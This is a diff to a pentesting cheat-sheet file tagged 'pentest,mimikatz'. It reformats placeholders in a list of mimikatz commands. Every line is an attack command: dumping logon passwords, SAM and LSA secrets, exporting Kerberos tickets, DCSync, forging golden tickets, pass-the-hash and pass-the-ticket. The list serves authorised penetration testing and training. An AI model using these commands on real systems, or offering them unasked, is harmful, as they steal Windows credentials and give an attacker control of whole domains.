@@ -1,38 +1,46 @@
-# privilege::debug                                                                                                                                                           │
-privilege::debug                                                                                                                                                           │
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-# token::elevate                                                                                                                                                             │
-token::elevate                                                                                                                                                             │
+% pentest,mimikatz
 
-# sekurlsa::logonpasswords                                                                                                                                                   │
-sekurlsa::logonpasswords                                                                                                                                                   │
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-# sekurlsa::tickets /export                                                                                                                                                  │
-sekurlsa::tickets /export                                                                                                                                                  │
+# privilege::debug
+privilege::debug
 
-# lsadump::sam                                                                                                                                                               │
-lsadump::sam                                                                                                                                                               │
+# token::elevate
+token::elevate
 
-# lsadump::dcsync /user:DOMAIN\USERNAME                                                                                                                                      │
-lsadump::dcsync /user:DOMAIN\USERNAME                                                                                                                                      │
+# sekurlsa::logonpasswords
+sekurlsa::logonpasswords
 
-# lsadump::lsa /patch                                                                                                                                                        │
-lsadump::lsa /patch                                                                                                                                                        │
+# sekurlsa::tickets /export
+sekurlsa::tickets /export
 
-# kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /target:IP /service:SPN /rc4:NTLM /user:USERNAME                                                                      │
-kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /target:IP /service:SPN /rc4:NTLM /user:USERNAME                                                                      │
+# lsadump::sam
+lsadump::sam
 
-# kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /krbrgt:NTLM                                                                                                          │
-kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /krbrgt:NTLM                                                                                                          │
+# lsadump::dcsync
+lsadump::dcsync /user:<domain>\<username>
 
-# sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM /run:COMMAND                                                                                                        │
-sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM /run:COMMAND                                                                                                        │
+# lsadump::lsa
+lsadump::lsa /patch
 
-# kerberos::ptt \path\to\kirbi                                                                                                                                               │
-kerberos::ptt \path\to\kirbi                                                                                                                                               │
+# kerberos::golden
+kerberos::golden /domain:<domain> /sid:<sid> /ptt /target:<ip> /service:<spn> /rc4:<ntlm> /user:<username>
 
-# kerberos::purge                                                                                                                                                            │
-kerberos::purge                                                                                                                                                            │
+# kerberos::golden
+kerberos::golden /domain:<domain> /sid:<sid> /ptt /krbrgt:<ntlm>
 
-# misc::cmd                                                                                                                                                                  │
-misc::cmd                                                                                                                                                                  │
+# sekurlsa::pth
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm> /run:<cmd>
+
+# kerberos::ptt
+kerberos::ptt <path>
+
+# kerberos::purge
+kerberos::purge
+
+# misc::cmd
+misc::cmd
